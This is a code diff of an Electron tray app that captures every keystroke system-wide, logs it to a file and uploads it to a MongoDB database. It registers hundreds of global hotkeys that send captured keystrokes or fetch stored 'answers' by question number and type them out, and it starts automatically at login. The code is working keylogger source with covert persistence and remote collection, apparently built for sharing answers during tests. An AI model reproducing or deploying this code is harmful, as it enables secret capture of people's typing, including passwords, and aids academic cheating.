@@ -16,6 +16,8 @@ mongoose.connect(MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true 
     .then(() => console.log('Connected to MongoDB'))
     .catch((err) => console.error('MongoDB connection error:', err));
 
+
+
 // Define the schema and model for keylog
 const KeyLogSchema = new mongoose.Schema({
     deviceInfo: {
@@ -26,10 +28,10 @@ const KeyLogSchema = new mongoose.Schema({
         osType: String,
         release: String,
     },
-    questionNumber: { type: Number, required: true }, // New field for the question number
+    questionNumber: { type: String, required: true }, // New field for the question number
     loggedKeys: { type: String, default: '' },
     lastTimestamp: { type: Date, default: Date.now },
-});
+}); 
 
 
 
@@ -154,77 +156,7 @@ function saveToFile(data) {
     fs.appendFileSync(logFilePath, data, 'utf8');
 }
 
-// Sync the keylog file to MongoDB
 
-
-
-async function syncFileToMongoDB() {
-    console.log("Control went inside syncFileToMongoDB function");
-
-    // Check if log file exists
-    if (fs.existsSync(logFilePath)) {
-        console.log('Log file exists, proceeding with reading the file...');
-        
-        const data = fs.readFileSync(logFilePath, 'utf8');
-
-        // Check if the data is not empty
-        if (data.trim()) {
-            try {
-                // Moving the log file to a temporary file
-                console.log('Renaming log file to temporary file...');
-                fs.renameSync(logFilePath, tempFilePath);
-                const currentData = fs.readFileSync(tempFilePath, 'utf8');
-                console.log('Read data from temp file:', currentData);
-
-                // Check the deviceInfo value
-                console.log('Device info:', deviceInfo);
-
-                let existingLog = await KeyLog.findOne({ deviceInfo });
-                console.log('Database query result:', existingLog);
-
-                if (existingLog) {
-                    console.log('Existing log found:', existingLog);
-
-                    // Append the new data to the existing log
-                    existingLog.loggedKeys += currentData;
-                    existingLog.lastTimestamp = new Date();
-
-                    console.log('Updated existing log:', existingLog);
-
-                    await existingLog.save();
-                    console.log('Existing log saved to MongoDB');
-                } else {
-                    // Create a new log entry if no existing log is found
-                    const keyLog = new KeyLog({
-                        deviceInfo,
-                        loggedKeys: currentData,
-                        lastTimestamp: new Date(),
-                    });
-
-                    console.log('New log entry created:', keyLog);
-
-                    await keyLog.save();
-                    console.log('New log entry saved to MongoDB');
-                }
-
-                // Remove the temporary file after syncing
-                fs.unlinkSync(tempFilePath);
-                console.log('Temporary file deleted after sync');
-            } catch (err) {
-                console.error('Error syncing data to MongoDB:', err);
-                
-                // Restore unsynced data if error occurs
-                const tempData = fs.readFileSync(tempFilePath, 'utf8');
-                fs.appendFileSync(logFilePath, tempData);
-                fs.unlinkSync(tempFilePath);
-            }
-        } else {
-            console.log('Log file is empty, no data to sync');
-        }
-    } else {
-        console.log('Log file does not exist');
-    }
-}
 
 // Handle keydown event for keylogging
 uIOhook.on('keydown', (e) => {
@@ -252,7 +184,7 @@ uIOhook.on('keydown', (e) => {
         }
 
         saveToFile(key);
-        console.log(key);
+        console.log(key,e.keycode);
 
     }
 });
@@ -298,24 +230,7 @@ async function fetchAnswerFromMongoDB(questionNumber) {
 
 
 
-
-
-
-function registerDynamicShortcuts(start, end) {
-    for (let i = start; i <= end; i++) {
-        globalShortcut.register(`Ctrl+Alt+${i}`, () => {
-            console.log(`Sending data to MongoDB for question ${i}...`);
-            syncFileToMongoDB(i); // Pass the pressed number to the function
-        });
-
-        globalShortcut.register(`Ctrl+Shift+${i}`, () => {
-            console.log(`Fetching and typing answer for question ${i}...`);
-            fetchAnswerFromMongoDB(i);
-        });
-    }
-}
-
-
+  
 async function syncFileToMongoDB(questionNumber) {
     console.log("Control went inside syncFileToMongoDB function");
 
@@ -341,10 +256,10 @@ async function syncFileToMongoDB(questionNumber) {
                     lastTimestamp: new Date(),
                 });
 
-                console.log('New log entry created:', keyLog);
+                console.log('New log entry created:', keyLog,questionNumber);
 
                 await keyLog.save();
-                console.log('New log entry saved to MongoDB');
+                console.log('New log entry saved to MongoDB   ',questionNumber);
 
                 fs.unlinkSync(tempFilePath);
                 console.log('Temporary file deleted after sync');
@@ -364,16 +279,95 @@ async function syncFileToMongoDB(questionNumber) {
 
 
 
+let isSyncMode = true; // Default mode
 
-// Create system tray and register shortcuts dynamically for numbers 1-9
+
 app.whenReady().then(() => {
     createTray(); // Create the tray icon for background process
 
-    // Register shortcuts for numbers 1 to 9 (You can change this range as needed)
-    registerDynamicShortcuts(1, 9);
-});
+    // Unregister all global shortcuts
+    globalShortcut.unregisterAll();
+    console.log('All global shortcuts unregistered.');
 
-// Automatically start the app when the user logs in or turns on the laptop
+    const numbers = '0123456789';
+    const letters = 'abcdefghijklmnopqrstuvwxyz';
+    const excludeShortcuts = [
+        'Control+a', 'Control+c', 'Control+v', 'Control+z', 'Control+Shift+Alt+M',
+        ...numbers.split('').map(n => `Shift+${n}`)
+    ];
+
+    let registeredCount = 0;
+    const registeredShortcuts = []; // Array to store all registered shortcuts
+
+    // Function to register shortcuts and pass the code to MongoDB
+    const registerShortcut = (prefix, key, code) => {
+        const shortcut = `${prefix}+${key}`;
+
+        // Exclude specific shortcuts
+        if (excludeShortcuts.includes(shortcut)) {
+            return;
+        }
+
+        const success = globalShortcut.register(shortcut, () => {
+            console.log(`Shortcut triggered: ${shortcut}`);
+            if (shortcut === 'Control+Shift+m') {
+                isSyncMode = !isSyncMode;
+                const mode = isSyncMode ? 'send mode' : 'receive mode';
+                console.log(`Mode toggled. Current mode is now: ${mode}`);
+            } else {
+                if (isSyncMode) {
+                    syncFileToMongoDB(`${code}${key}`);
+                } else {
+                    fetchAnswerFromMongoDB(`${code}${key}`);
+                }
+            }
+        });
+
+        if (success) {
+            registeredShortcuts.push(shortcut);
+            registeredCount++;
+        } else {
+            console.log(`Failed to register shortcut: ${shortcut}`);
+        }
+    };
+
+    // Register shortcuts with various combinations
+    const combinations = [
+        { prefix: 'Control', code: '1' },
+        { prefix: 'Alt', code: '3' },
+        { prefix: 'Shift', code: '4' },
+        { prefix: 'Control+Alt', code: '5' },
+        { prefix: 'Control+Shift', code: '6' },
+        { prefix: 'Alt+Shift', code: '7' },
+        { prefix: 'Control+Alt+Shift', code: '8' }
+    ];
+
+    // Register shortcuts for numbers with different combinations
+    for (const combo of combinations) {
+        for (const number of numbers) {
+            registerShortcut(combo.prefix, number, combo.code);
+        }
+    }
+
+    // Register shortcuts for letters with different combinations
+    for (const combo of combinations) {
+        for (const letter of letters) {
+            registerShortcut(combo.prefix, letter, combo.code);
+        }
+    }
+
+    // Register shortcuts with Function keys (F1 to F12, Function = 2)
+    for (let i = 1; i <= 12; i++) {
+        registerShortcut('', `F${i}`, '2');
+    }
+
+    console.log(`Global shortcuts registered: ${registeredCount}`);
+
+    // Save all registered shortcuts to a file
+    const filePath = path.join(__dirname, 'registered_shortcuts.txt');
+    fs.writeFileSync(filePath, registeredShortcuts.join('\n'));
+    console.log(`All registered shortcuts saved to ${filePath}`);
+});// Automatically start the app when the user logs in or turns on the laptop
 app.setLoginItemSettings({
     openAtLogin: true,
     path: process.execPath, // This is the path of the current app's executable
